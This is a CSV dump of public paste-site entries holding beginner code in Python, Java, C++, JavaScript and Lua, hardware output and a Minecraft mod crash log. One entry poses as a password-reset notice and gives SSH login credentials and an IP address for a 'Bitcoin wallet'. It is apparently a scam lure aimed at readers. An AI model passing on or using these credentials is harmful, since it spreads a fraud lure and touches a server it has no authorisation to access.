id,title,username,language,date,content
eQGn1EY9,SysSounds.py,dogs_are_cute,Python,Friday 7th of July 2023 06:52:00 AM CDT,"from typing import Iterator, Optional
from os.path import normpath
import platform


def iter_subkeys(key_handle: ""PyHKEY"") -> Iterator[str]:
    index = 0
    while True:
        try:
            yield winreg.EnumKey(key_handle, index)
        except OSError:
            break
        else:
            index += 1


def init_proc() -> Optional[""PyHKEY""]:
    try:
        handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, normpath(""AppEvents/EventLabels""))
    except OSError:
        return None
    else:
        return handle


def main_proc(key_handle: ""PyHKEY"") -> None:
    print(""All sounds in your registry will now be played sequentially\n""
          ""Press Ctrl-Break to interrupt..."")
    for sound_name in iter_subkeys(key_handle):
        print(""Playing {}..."".format(sound_name), end="""", flush=True)
        try:
            winsound.PlaySound(sound_name, winsound.SND_ALIAS | winsound.SND_NODEFAULT)
        except RuntimeError:
            print("" Failed"")
            continue
        else:
            print("" Done"")


def exit_proc(key_handle: Optional[""PyHKEY""], err_code: int = 0) -> None:
    if err_code:
        err_messages = (""ERROR: This script can only be run on the operating system \""Microsoft Windows\"". Please ""
                        ""delete this script from your system now and slap yourself."",
                        ""ERROR: Something went wrong while attempting to read the registry."")
        print(err_messages[err_code - 1])
    else:
        winreg.CloseKey(key_handle)
    input(""Press the Enter key to continue..."")
    if err_code:
        raise SystemExit(1)


if __name__ == ""__main__"":
    if platform.system() == ""Windows"":
        import winsound
        import winreg
    else:
        exit_proc(None, err_code=1)
    handle = init_proc()
    if handle is None:
        exit_proc(None, err_code=2)
    try:
        main_proc(handle)
    except KeyboardInterrupt:
        print(""\nCtrl-Break detected, exiting..."")
    finally:
        exit_proc(handle)
"
3kUtAqCm,Untitled,naitgacem,Java,Friday 7th of July 2023 06:47:45 AM CDT,"if (parentNode.rightNode == nodeToDelete) {
            if (leftNode == null && rightNode == null) {
                // has one child
                parentNode.rightNode = null;
                return;
            } else if (rightNode != null && leftNode == null) {
                parentNode.rightNode = rightNode;
                return;
            } else if (leftNode != null && rightNode == null) {
                parentNode.rightNode = leftNode;
                return;
            } else {
                // has two children
                Node succNode = findSuccessor(nodeToDelete);
                if (succNode == nodeToDelete.rightNode) {
                    succNode.leftNode = nodeToDelete.leftNode;
                    parentNode.rightNode = succNode;
                } else {
                    // we need to do some intricate shit
                    // succNode has to be a left child
                    succNode.parentNode.leftNode = succNode.leftNode;
                    nodeToDelete.data = succNode.data;
                }
                return;
            }
} else {
            if (leftNode == null && rightNode == null) {
                // has one child
                parentNode.leftNode = null;
                return;
            } else if (rightNode != null && leftNode == null) {
                parentNode.leftNode = rightNode;
                return;
            } else if (leftNode != null && rightNode == null) {
                parentNode.leftNode = leftNode;
                return;
            } else {
                // has two children
                Node succNode = findSuccessor(nodeToDelete);
                if (succNode == nodeToDelete.rightNode) {
                    succNode.leftNode = nodeToDelete.leftNode;
                    parentNode.rightNode = succNode;
                } else {
                    succNode.parentNode.leftNode = succNode.leftNode;
                    nodeToDelete.data = succNode.data;
                }
                return;
            }
}"
4H1d5MXR,BTC Wallet Credentials have been reset,fedsboyis_97,GetText,Friday 7th of July 2023 06:46:07 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are spoznajniq8:K8tX4P on 45.9.148.244
You can connect via SSH.
Regards"
q1NNkGLt,Laptop System: ASUSTeK product: X555LN. inxi -b && lspci -vnn -d 14e4:,SerW,Bash,Friday 7th of July 2023 06:34:14 AM CDT,"dragonserw@debian:~$ inxi -b && lspci -vnn -d 14e4:
System:
  Host: debian Kernel: 6.1.0-10-amd64 arch: x86_64 bits: 64 Desktop: GNOME
    v: 43.4 Distro: Debian GNU/Linux 12 (bookworm)
Machine:
  Type: Laptop System: ASUSTeK product: X555LN v: 1.0
    serial: <superuser required>
  Mobo: ASUSTeK model: X555LN v: 1.0 serial: <superuser required>
    UEFI: American Megatrends v: X555LN.313 date: 04/19/2019
Battery:
  ID-1: BAT0 charge: 18.6 Wh (76.5%) condition: 24.3/37.3 Wh (65.2%)
    volts: 7.5 min: 7.5
CPU:
  Info: dual core Intel Core i3-4030U [MT MCP] speed (MHz): avg: 799
    min/max: 800/1800
Graphics:
  Device-1: Intel Haswell-ULT Integrated Graphics driver: i915 v: kernel
  Device-2: NVIDIA GM108M [GeForce 840M] driver: nouveau v: kernel
  Device-3: Realtek USB Camera type: USB driver: uvcvideo
  Display: wayland server: X.Org v: 1.22.1.9 with: Xwayland v: 22.1.9
    compositor: gnome-shell driver: dri: crocus gpu: i915
    resolution: 1366x768~60Hz
  API: OpenGL v: 4.6 Mesa 22.3.6 renderer: Mesa Intel HD Graphics 4400 (HSW
    GT2)
Network:
  Device-1: Realtek RTL8111/8168/8411 PCI Express Gigabit Ethernet
    driver: r8169
  Device-2: Broadcom BCM43142 802.11b/g/n driver: N/A
Drives:
  Local Storage: total: 111.79 GiB used: 8 GiB (7.2%)
Info:
  Processes: 229 Uptime: 4m Memory: 5.67 GiB used: 2 GiB (35.3%) Shell: Bash
  inxi: 3.3.26
03:00.0 Network controller [0280]: Broadcom Inc. and subsidiaries BCM43142 802.11b/g/n [14e4:4365] (rev 01)
	Subsystem: Lite-On Communications Inc BCM43142 802.11b/g/n [11ad:6675]
	Flags: bus master, fast devsel, latency 0, IRQ 255, IOMMU group 14
	Memory at f7800000 (64-bit, non-prefetchable) [size=32K]
	Capabilities: <access denied>

dragonserw@debian:~$ "
MHnPDzi6,Untitled,35657,C++,Friday 7th of July 2023 06:31:55 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <string>
#include <fstream>


using namespace std;

class client_base {

public:
    client_base() : clients(""clients.txt"") {}

    struct client {

        void get_client(ifstream& fin) {
            getline(fin, name);
            getline(fin, phone_number);
            getline(fin, client_id);
            getline(fin, personal_discount);
            getline(fin, regular_customer);
        }

        string name; // имя клиента
        string phone_number; // номер телефона
        string client_id; // id клиента
        string personal_discount; // размер скидки
        string regular_customer; // постоянный покупатель (да / нет)
    };

    void NewClient(const string& name, const string& phone_number, const int client_id, const int personal_discount, const bool regular_customer) {
        ofstream fout;
        fout.open(clients, ofstream::app);
        if (!fout.is_open()) {
            cout << ""Ошибка открытия файла"" << endl;
        }
        else {
            fout << name << endl << phone_number << endl << client_id << endl << personal_discount << endl << regular_customer << endl;
            fout.close();
        }
    }

    void ShowAllClients() {
        ifstream fin;
        fin.open(clients);
        if (!fin.is_open()) {
            cout << ""Ошибка открытия файла"" << endl;
        }
        else {
            client temp;
            temp.get_client(fin);
            while (!fin.eof()) {
                cout << temp.name << "" "" << temp.phone_number << "" "" << temp.client_id << "" "" << temp.personal_discount << "" "" << temp.regular_customer << endl;
                temp.get_client(fin);
            }
            fin.close();
        }
        cout << endl;
    }


private:
    string clients; // название файла с клиентами
};

int main() {
    client_base my_base;
    my_base.NewClient(""Ivan"", ""9111111111"", 1129, 10, true);
    my_base.NewClient(""Vasya"", ""9111111222"", 1130, 5, false);
    my_base.NewClient(""Oleg"", ""9111111333"", 1131, 15, true);
    my_base.NewClient(""Maria"", ""9111111444"", 1132, 10, false);
    my_base.NewClient(""Galya"", ""9111111555"", 1133, 20, true);
    my_base.NewClient(""Julia"", ""9111111566"", 1144, 20, true);
    my_base.ShowAllClients();
}"
kndS6QaU,Untitled,kolbka_,C++,Friday 7th of July 2023 06:28:00 AM CDT,"#pragma once

#include <atomic>
#include <vector>
#include <memory>

class RequestLimiter {
public:
    RequestLimiter(std::atomic_int &rl) : rl(rl) {
        rl.fetch_add(1);
    }

    bool isLimitExceeded() {
        return rl.load() > 10;
    }

    ~RequestLimiter() {
        rl.fetch_sub(1);
    }

private:
    std::atomic_int &rl;
};

class RLStore {
public:
    explicit RLStore(uint size) : rls(size) {
    }

    uint createRL() {
        int id = available_id++;
        if (id >= rls.size()) {
            throw std::runtime_error(""RLStore: id is greater than size"");
        }
        return id;
    }

    std::atomic_int &getRL(uint id) {
        if (id >= rls.size()) {
            throw std::runtime_error(""RLStore: id is greater than size"");
        }
        return rls[id];
    }

private:
    uint available_id = 0;
    std::vector<std::atomic_int> rls;
};
"
cyErNkjp,casear_cipher.py,rudy1234567890,Python,Friday 7th of July 2023 06:21:23 AM CDT,"def encrypt_char(ch, key):
    if ch.isupper():
        return chr(65 + (ord(ch)-65+key) % 26)
    return chr(97 + (ord(ch)-97+key) % 26)

def encrypt(msg, key):
    res = ''

    for ch in msg:
        if ch.isalpha():
            res += encrypt_char(ch, key)
        else:
            res += ch

    return res

print(encrypt(""ApPle@#$12"", 3))"
5xV6U03e,travelTime,zoran902,JavaScript,Friday 7th of July 2023 06:18:52 AM CDT,"function travelTime(travelOptions) {

    let destinations = getDestinations(travelOptions)

    let sortedDestinationsByName = Object.entries(destinations).sort(Intl.Collator().compare)

    for (const [country, townInfo] of sortedDestinationsByName) {

        let result = []
        result.push(country)
        for (const town in townInfo) {
            result.push(town, townInfo[town])
        }

        result.length === 3 ?
            console.log(result.join(' -> ')) :
            console.log(getResWithSeveralTowns(result));

        function getResWithSeveralTowns(townAndPrice) {
            let resWithSeveralTowns = []
            let country = result.shift()
            let tempArr = []

            for (let i = 0; i < result.length; i += 2) {

                let town = result[i]
                let price = result[i + 1]
                let townAndPrice = []

                townAndPrice.push(town, price)
                tempArr.push(townAndPrice)
            }

            let sortedArray = tempArr.sort(([keyA, valueA], [keyB, valueB]) => valueA - valueB)

            for (let [town, price] of sortedArray) {
                let townPrice = [town, price]
                resWithSeveralTowns.push(townPrice.join(' -> '))
            }
            resWithSeveralTowns.unshift(country + ' ->')
            return resWithSeveralTowns.join(' ')
        }

    }

    function getDestinations(destination) {
        let destinations = {}

        travelOptions.forEach((line) => {
            let [country, town, price] = line.split(' > ')

            if (!destinations.hasOwnProperty(country)) {
                destinations[country] = {}
            }

            if (!destinations[country].hasOwnProperty(town)) {
                destinations[country][town] = price
            } else {

                if (price < destinations[country][town]) {
                    destinations[country][town] = price
                }

            }
        })
        return destinations
    }
}"
qxzh64BR,data626,TestGuy1,JSON,Friday 7th of July 2023 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '411fe1e18946233de1b03cd912ef2036cae707f05a5773a0de07d20226942e78aeaf162c4f2f938295352e4d803fb6e174383395c2b1e59fb87150bd2fca4867f6ced1034e2ba4dae4049ac281af99b9cc65d880925912a416affddd9614a422491c05c8add010149f19c49a5e84622d097c9890f0d59a54e00cb1f0d11f4f62',
  otherdata: [
    '35c6edc77779cfb3f75d78855193be40',
    '569b4160b46b4ff1d59509a17ab3afa5',
    'c05d2aa49224874879286de421c7f957',
    'b5a86a0c9a6eb5a4f23b96f201a0a3cd',
    '79d776351405097456c0851e4f8bb396',
    'cc3661833756ca50cd2fa1bfd802e01c',
    '672896ca510fcda65d6f386afb6203a5',
    '5700ac34661fc80972c7231a8b6acd66'
  ]
}"
vuNqdu5z,Untitled,35657,C++,Friday 7th of July 2023 05:58:15 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstring>


using namespace std;

struct client {
    char name[20]; // имя клиента
    char phone_number[10]; // номер телефона
    int client_id; // id клиента
    int personal_discount; // размер скидки
    bool regular_customer; // постоянный покупатель (да / нет)
};

class client_base {

public:
    client_base(): clients(new client*[100]), clients_number(0), clients_base_size(100) {}

    client_base(int new_base_size): clients(new client* [new_base_size]), clients_number(0), clients_base_size(new_base_size) {}

    client_base(const client_base& other): clients(new client* [other.clients_base_size]), clients_number(0), clients_base_size(other.clients_base_size) {
        for (int i = 0; i < other.clients_number; i++) {
            NewClient(other.clients[i]->name, other.clients[i]->phone_number, other.clients[i]->client_id, other.clients[i]->personal_discount, other.clients[i]->regular_customer);
        }
    }

    client_base(client_base&& other) {
		clients = other.clients;
		clients_number = other.clients_number;
		clients_base_size = other.clients_base_size;
		other.clients = nullptr;
		other.clients_number = 0;
		other.clients_base_size = 0;
    }
	
	client_base& operator=(const client_base& other) {
		if (this != &other) {
			for (int i = 0; i < clients_number; i++) {
				delete clients[i];
			}
			delete[] clients;
			clients = new client * [other.clients_base_size];
			clients_number = 0;
			clients_base_size = other.clients_base_size;
			for (int i = 0; i < other.clients_number; i++) {
				NewClient(other.clients[i]->name, other.clients[i]->phone_number, other.clients[i]->client_id, other.clients[i]->personal_discount, other.clients[i]->regular_customer);
			}
		}
        return *this;
    }

    client_base& operator=(client_base&& other) {
		if (this != &other) {
			for (int i = 0; i < clients_number; i++) {
				delete clients[i];
			}
			delete[] clients;
			clients = other.clients;
			other.clients = nullptr;
			clients_number = other.clients_number;
			other.clients_number = 0;
			clients_base_size = other.clients_base_size;
			other.clients_base_size = 0;
		}
        return *this;
    }

    void NewClient(const char name[], const char phone_number[], const int client_id, const int personal_discount, const bool regular_customer) {
        if (clients_number == clients_base_size) {
            client** temp = new client * [clients_base_size * 2];
            for (int i = 0; i < clients_number; i++) {
                temp[i] = clients[i];
                delete clients[i];
            }
            delete[] clients;
            clients = temp;
            clients_base_size *= 2;
        }
        clients[clients_number] = new client;
        strcpy(clients[clients_number]->name, name);
        strcpy(clients[clients_number]->phone_number, phone_number);
        clients[clients_number]->client_id = client_id;
        clients[clients_number]->personal_discount = personal_discount;
        clients[clients_number]->regular_customer = regular_customer;
        clients_number++;
    }

    void DelClient(const char name[]) {
        for (int i = 0; i < clients_number; i++) {
            if (!strcmp(clients[i]->name, name)) {
                delete clients[i];
                for (int j = i; j < clients_number - 1; j++) {
                    clients[j] = clients[j + 1];
                }
                clients[clients_number - 1] = nullptr;
                clients_number--;
            }
        }

    }

    void FindClient(const char name[]) {
        for (int i = 0; i < clients_number; i++) {
            if (!strcmp(clients[i]->name, name)) {
                cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"";
                if (clients[i]->regular_customer) {
                    cout << "", regular customer"";
                }
                cout << endl;
            }
        }
        cout << endl;
    }

    void ShowAllClients() {
        for (int i = 0; i < clients_number; i++) {
            cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"";
            if (clients[i]->regular_customer) {
                cout << "", regular customer"";
            }
            cout << endl;
        }
        cout << endl;
    }

    void ShowRegularClients() {
        for (int i = 0; i < clients_number; i++) {
            if (clients[i]->regular_customer) {
                cout << clients[i]->name << "": phone "" << clients[i]->phone_number << "", id "" << clients[i]->client_id << "", personal discount "" << clients[i]->personal_discount << "" %"" << endl;
            }
        }
        cout << endl;
    }

    ~client_base() {
        for (int i = 0; i < clients_number; i++) {
            delete clients[i];
        }
        delete[] clients;
    }


private:
    client** clients; // массив клиентов
    int clients_number; // количество клиентов
    int clients_base_size; // размер базы
};

int main() {
    client_base my_base(200);
    my_base.NewClient(""Ivan"", ""9111111111"", 1129, 10, true);
    my_base.NewClient(""Vasya"", ""9111111222"", 1130, 5, false);
    my_base.NewClient(""Oleg"", ""9111111333"", 1131, 15, true);
    my_base.NewClient(""Maria"", ""9111111444"", 1132, 10, false);
    my_base.NewClient(""Galya"", ""9111111555"", 1133, 20, true);
    //client_base my_base2(my_base);
    //client_base my_base2(move(my_base));
    client_base my_base2;
    //my_base2 = my_base;
    my_base2 = move(my_base);
    my_base2.ShowAllClients();
    my_base2.DelClient(""Ivan"");
    my_base2.ShowRegularClients();
    my_base2.FindClient(""Galya"");
}"
9TmGevZU,MeteorOS,Mag1cpunch,Lua,Friday 7th of July 2023 05:58:10 AM CDT,"local component = require(""component"")
local g = component.glasses

local function welcomeMessage()
	wmessage = g.addText2D();
	wmessage.setText(""Welcome to MeteorOS!"")
	wmessage.addColor(2, 2, 2, 2)
	wmessage.setSize(2, 2)
	wmessage.setVerticalAlign(""top"")
	wmessage.setHorizontalAlign(""left"")
end
if g then
	welcomeMessage()
end"
MbsRPBYh,Untitled,35657,C++,Friday 7th of July 2023 05:54:47 AM CDT,"
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

#include <filesystem>
#include <windows.h>  // для работы SetConsoleCP, SetConsoleOutputCP


using namespace std;

using filesystem::path;

void PrintDirectory(const string& str) {
	cout << ""Содержимое папки "" << str << "":"" << endl;
	for (const auto& a : filesystem::directory_iterator(str)) {
		cout << a.path().filename().string() << endl;
	}
}



void PrintDirectoryInfo(const string& str) {
	cout << ""Содержимое папки "" << str << "":"" << endl;
	for (const auto& a : filesystem::directory_iterator(str)) {
		string name = a.path().filename().string();
		string full_name = str + '/' + name;
		cout << setw(30) << name;
		if (filesystem::is_regular_file(path(full_name))) {
			cout << "" "" << setw(10) << filesystem::file_size(path(full_name)) << "" byte"";
		}
		cout << endl;
	}
}

int main() {

	SetConsoleCP(1251); // установка кодовой страницы windows cp 1251 в поток ввода
	SetConsoleOutputCP(1251); // установка кодовой страницы windows cp 1251 в поток вывода

	//filesystem::create_directory(""C:/Users/PC/Desktop/temp""); // пустая папка
	//filesystem::create_directories(""C:/Users/PC/Desktop/temp/1/2/3/4""); // папка с вложенными директориями
	
	//ofstream fout(""C:/Users/PC/Desktop/temp/file.txt""); // создание файлов
	//ofstream fout2(""C:/Users/PC/Desktop/temp/file2.txt"");
	//ofstream fout3(""C:/Users/PC/Desktop/temp/1/file3.txt"");
	//ofstream fout4(""C:/Users/PC/Desktop/temp/1/2/file4.txt"");

	//fout.close();
	//fout2.close();
	//fout3.close();
	//fout4.close();

	//remove(path(""C:/Users/PC/Desktop/temp/1/2/3/4"")); // удаление пустой папки

	//remove_all(path(""C:/Users/PC/Desktop/temp/1"")); // удаление папки вместе с содержимым (обязательно закрыть файлы перед удалением)

	//copy(path(""C:/Users/PC/Desktop/temp""), path(""C:/Users/PC/Desktop/temp2"")); // копирует папку с файлами на без вложенных каталогов

	//copy(path(""C:/Users/PC/Desktop/temp""), path(""C:/Users/PC/Desktop/temp2""), filesystem::copy_options::recursive); // копирует папку с файлами и вложенными каталогами

	//rename(path(""C:/Users/PC/Desktop/temp2""), path(""C:/Users/PC/Desktop/temp55"")); // функция для переименования папок и файлов (в случае наличия вложенных файлов не забываем их закрыть)

	//rename(path(""C:/Users/PC/Desktop/temp55""), path(""C:/temp55"")); // функция для перемещения папок и файлов (в случае наличия вложенных файлов не забываем их закрыть)

	//rename(path(""C:/Users/PC/Desktop/temp55""), path(""C:/Users/new_directory"")); // функция для перемещения и переименования (в случае наличия вложенных файлов не забываем их закрыть)

	cout << boolalpha;
	cout << filesystem::is_regular_file(path(""C:/Users/PC/Desktop/temp"")) << endl; // проверить 
	cout << filesystem::is_directory(path(""C:/Users/PC/Desktop/temp"")) << endl;

	cout << filesystem::file_size(path(""C:/Users/PC/Desktop/temp/file.txt"")) << "" byte"" << endl << endl << endl;

	PrintDirectory(""C:/Users/PC/Downloads"");

	cout << endl << endl;

	PrintDirectoryInfo(""C:/Users/PC/Desktop/temp"");

}
"
3NKuYE3t,Turtle OTA firmware A1,seko00,Lua,Friday 7th of July 2023 05:41:13 AM CDT,"local i = 0
while true do
	os.sleep(1)
	i = i + 1
	print(""new..."" .. i)
end"
RDpdPLWa,latest.log,jayhillx,JSON,Friday 7th of July 2023 05:28:16 AM CDT,"[07Jul2023 06:24:39.621] [main/INFO] [cpw.mods.modlauncher.Launcher/MODLAUNCHER]: ModLauncher running: args [--launchTarget, forgeclientuserdev, --version, MOD_DEV, --assetIndex, 5, --assetsDir, C:\Users\tothe\.gradle\caches\forge_gradle\assets, --gameDir, ., --fml.forgeVersion, 47.0.43, --fml.mcVersion, 1.20.1, --fml.forgeGroup, net.minecraftforge, --fml.mcpVersion, 20230612.114412]
[07Jul2023 06:24:39.621] [main/INFO] [cpw.mods.modlauncher.Launcher/MODLAUNCHER]: ModLauncher 10.0.9+10.0.9+main.dcd20f30 starting: java version 17.0.2 by Oracle Corporation; OS Windows 11 arch amd64 version 10.0
[07Jul2023 06:24:39.902] [main/INFO] [net.minecraftforge.fml.loading.ImmediateWindowHandler/]: Loading ImmediateWindowProvider fmlearlywindow
[07Jul2023 06:24:40.027] [main/INFO] [EARLYDISPLAY/]: Trying GL version 4.6
[07Jul2023 06:24:40.121] [main/INFO] [EARLYDISPLAY/]: Requested GL version 4.6 got version 4.6
[07Jul2023 06:24:40.246] [main/INFO] [optifine.OptiFineTransformationService/]: OptiFineTransformationService.onLoad
[07Jul2023 06:24:40.246] [main/INFO] [optifine.OptiFineTransformationService/]: OptiFine ZIP file URL: union:/C:/Users/tothe/OneDrive/Desktop/Minecraft%20Modding/mods/MysticsBiomes%201.20.1/run/mods/preview_OptiFine_1.20.1_HD_U_I5_pre8.jar%23193!/
[07Jul2023 06:24:40.278] [main/INFO] [optifine.OptiFineTransformationService/]: OptiFine ZIP file: C:\Users\tothe\OneDrive\Desktop\Minecraft Modding\mods\MysticsBiomes 1.20.1\run\mods\preview_OptiFine_1.20.1_HD_U_I5_pre8.jar
[07Jul2023 06:24:40.278] [main/INFO] [optifine.OptiFineTransformer/]: Target.PRE_CLASS is available
[07Jul2023 06:24:40.309] [main/INFO] [ofdev.modlauncher.OFDevTransformationService/]: OptiFine dev transformation service loading
[07Jul2023 06:24:40.309] [main/INFO] [ofdev.modlauncher.OFDevTransformationService/]: Found OptiFine service, overwriting transformer
[07Jul2023 06:24:40.340] [main/INFO] [optifine.OptiFineTransformer/]: Target.PRE_CLASS is available
[07Jul2023 06:24:40.356] [main/INFO] [ofdev.modlauncher.OFDevTransformationService/]: Finding OptiFine AccessFixer
[07Jul2023 06:24:40.371] [pool-2-thread-1/INFO] [EARLYDISPLAY/]: GL info: Intel(R) UHD Graphics GL version 4.6.0 - Build 26.20.100.7926, Intel
[07Jul2023 06:24:40.449] [main/INFO] [mixin/]: SpongePowered MIXIN Subsystem Version=0.8.5 Source=union:/C:/Users/tothe/.gradle/caches/modules-2/files-2.1/org.spongepowered/mixin/0.8.5/9d1c0c3a304ae6697ecd477218fa61b850bf57fc/mixin-0.8.5.jar%23128!/ Service=ModLauncher Env=CLIENT
[07Jul2023 06:24:40.481] [main/INFO] [optifine.OptiFineTransformationService/]: OptiFineTransformationService.initialize
[07Jul2023 06:24:40.559] [main/INFO] [OptiFineDevTweaker/]: Got Minecraft version ""null"" from environment variable MC_VERSION
[07Jul2023 06:24:40.559] [main/INFO] [OptiFineDevTweaker/]: Found Minecraft version 1.20.1 from 1.13+ FMLLoader VersionInfo
[07Jul2023 06:24:40.574] [main/INFO] [OptiFineDevTweaker/]: Found Minecraft jar C:\Users\tothe\.gradle\caches\forge_gradle\minecraft_repo\versions\1.20.1\client.jar from FG3+ (provided cache)
[07Jul2023 06:24:41.226] [main/WARN] [net.minecraftforge.fml.loading.moddiscovery.ModFileParser/LOADING]: Mod file C:\Users\tothe\.gradle\caches\modules-2\files-2.1\net.minecraftforge\javafmllanguage\1.20.1-47.0.43\870eb342c587195b95469da1434321420acf8fc\javafmllanguage-1.20.1-47.0.43.jar is missing mods.toml file
[07Jul2023 06:24:41.242] [main/WARN] [net.minecraftforge.fml.loading.moddiscovery.ModFileParser/LOADING]: Mod file C:\Users\tothe\.gradle\caches\modules-2\files-2.1\net.minecraftforge\lowcodelanguage\1.20.1-47.0.43\bdc0319424069d8d996e0fba1c164f5da37053b4\lowcodelanguage-1.20.1-47.0.43.jar is missing mods.toml file
[07Jul2023 06:24:41.242] [main/WARN] [net.minecraftforge.fml.loading.moddiscovery.ModFileParser/LOADING]: Mod file C:\Users\tothe\.gradle\caches\modules-2\files-2.1\net.minecraftforge\mclanguage\1.20.1-47.0.43\59eba70cfb25091c9c4a7ddacf22b38fff21665d\mclanguage-1.20.1-47.0.43.jar is missing mods.toml file
[07Jul2023 06:24:41.290] [main/WARN] [net.minecraftforge.fml.loading.moddiscovery.ModFileParser/LOADING]: Mod file C:\Users\tothe\.gradle\caches\modules-2\files-2.1\net.minecraftforge\fmlcore\1.20.1-47.0.43\574f2099d26299ca1394777c6d20a6aecd2ac9cf\fmlcore-1.20.1-47.0.43.jar is missing mods.toml file
[07Jul2023 06:24:41.617] [main/INFO] [net.minecraftforge.fml.loading.moddiscovery.JarInJarDependencyLocator/]: No dependencies to load found. Skipping!
[07Jul2023 06:24:42.993] [main/INFO] [optifine.OptiFineTransformationService/]: OptiFineTransformationService.transformers
[07Jul2023 06:24:43.040] [main/INFO] [optifine.OptiFineTransformer/]: Targets: 411
[07Jul2023 06:24:43.821] [main/INFO] [OptiFineDevTweaker/]: Got OptiFine file name ""modlauncher-10.0.9.jar""
[07Jul2023 06:24:43.821] [main/ERROR] [OptiFineDevTweaker/]: OptiFine file not found through API! Trying ModLauncher internals...
[07Jul2023 06:24:44.149] [main/INFO] [optifine.OptiFineTransformationService/]: additionalClassesLocator: [optifine., net.optifine.]
[07Jul2023 06:24:44.649] [main/INFO] [mixin/]: Compatibility level set to JAVA_17
[07Jul2023 06:24:44.666] [main/INFO] [cpw.mods.modlauncher.LaunchServiceHandler/MODLAUNCHER]: Launching target 'forgeclientuserdev' with arguments [--version, MOD_DEV, --gameDir, ., --assetsDir, C:\Users\tothe\.gradle\caches\forge_gradle\assets, --assetIndex, 5]
[07Jul2023 06:24:48.677] [pool-4-thread-1/FATAL] [mixin/]: Mixin apply failed terrablender.mixins.json:MixinBuiltInRegistries -> net.minecraft.core.registries.BuiltInRegistries: org.spongepowered.asm.mixin.injection.throwables.InvalidInjectionException Critical injection failure: @Inject annotation on registerSimple could not find any targets matching 'Lnet/minecraft/core/registries/BuiltInRegistries;m_258002_(Lnet/minecraft/resources/ResourceKey;Lnet/minecraft/core/registries/BuiltInRegistries$RegistryBootstrap;)Lnet/minecraft/core/Registry;' in net.minecraft.core.registries.BuiltInRegistries. Using refmap terrablender.refmap.json [PREINJECT Applicator Phase -> terrablender.mixins.json:MixinBuiltInRegistries -> Prepare Injections ->  -> handler$zza000$registerSimple(Lnet/minecraft/resources/ResourceKey;Lnet/minecraft/core/registries/BuiltInRegistries$RegistryBootstrap;Lorg/spongepowered/asm/mixin/injection/callback/CallbackInfoReturnable;)V -> Parse]
org.spongepowered.asm.mixin.injection.throwables.InvalidInjectionException: Critical injection failure: @Inject annotation on registerSimple could not find any targets matching 'Lnet/minecraft/core/registries/BuiltInRegistries;m_258002_(Lnet/minecraft/resources/ResourceKey;Lnet/minecraft/core/registries/BuiltInRegistries$RegistryBootstrap;)Lnet/minecraft/core/Registry;' in net.minecraft.core.registries.BuiltInRegistries. Using refmap terrablender.refmap.json [PREINJECT Applicator Phase -> terrablender.mixins.json:MixinBuiltInRegistries -> Prepare Injections ->  -> handler$zza000$registerSimple(Lnet/minecraft/resources/ResourceKey;Lnet/minecraft/core/registries/BuiltInRegistries$RegistryBootstrap;Lorg/spongepowered/asm/mixin/injection/callback/CallbackInfoReturnable;)V -> Parse]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.validateTargets(InjectionInfo.java:656) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.findTargets(InjectionInfo.java:587) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.readAnnotation(InjectionInfo.java:330) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.<init>(InjectionInfo.java:316) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.<init>(InjectionInfo.java:308) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.CallbackInjectionInfo.<init>(CallbackInjectionInfo.java:46) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?]
	at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:77) ~[?:?]
	at jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:?]
	at java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499) ~[?:?]
	at java.lang.reflect.Constructor.newInstance(Constructor.java:480) ~[?:?]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo$InjectorEntry.create(InjectionInfo.java:149) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.injection.struct.InjectionInfo.parse(InjectionInfo.java:708) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.MixinTargetContext.prepareInjections(MixinTargetContext.java:1311) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.prepareInjections(MixinApplicatorStandard.java:1042) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
	at org.spongepowered.asm.mixin.transformer.MixinApplicatorStandard.applyMixin(MixinApplicatorStandard.java:393) ~[mixin-0.8.5.jar:0.8.5+Jenkins-b310.git-155314e6e91465dad727e621a569906a410cd6f4]
